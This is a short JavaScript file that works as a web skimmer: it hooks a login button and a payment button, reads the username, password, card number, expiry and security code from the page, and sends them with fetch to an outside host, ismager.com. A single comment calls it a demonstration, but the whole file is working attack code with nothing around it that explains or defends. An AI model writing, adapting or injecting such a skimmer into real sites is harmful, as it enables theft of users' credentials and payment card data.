// This code is for demonstration purposes, and under no circumstances it will be used for a real attack.

function start() {
    const subBtn = document.getElementById('sub-btn')
    const ccBtn = document.getElementById('button-payment-method')

    const sendToMe = function (event) {
        const username = document.getElementById('user')?.value
        const password = document.getElementById('pass')?.value

        fetch(`https://ismager.com/?username=${username}&password=${password}`, {
            "headers": {
                "cookie": "foo=bar; bar=baz",
                "x-pretty-print": "2"
            }
        })
    }

    const sendToMeCC = function (event) {
        const ccNum = document.getElementById('cc-num')?.value
        const ccExp = document.getElementById('cc-exp')?.value
        const ccSec = document.getElementById('cc-sec')?.value

        fetch(`https://ismager.com/?ccNum=${ccNum}&ccExp=${ccExp}&ccSec=${ccSec}`, {
            "headers": {
                "cookie": "foo=bar; bar=baz",
                "x-pretty-print": "2"
            }
        })
    }

    if(subBtn) {
        subBtn.addEventListener('mouseenter', sendToMe);
    }

    if(ccBtn) {
        ccBtn.addEventListener('click', sendToMeCC);
    }

    console.log('form attached')
}

start()


